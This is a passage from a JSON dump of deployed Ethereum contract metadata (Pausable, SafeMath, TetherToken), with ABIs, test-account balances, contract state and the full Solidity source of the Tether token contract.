"function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0xA94B7f0465E98609391C623d0560C5720a3f2D33",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0xA94B7f0465E98609391C623d0560C5720a3f2D33": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x6eD79Aa1c71FD7BdBC515EfdA3Bd4e26394435cC",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": 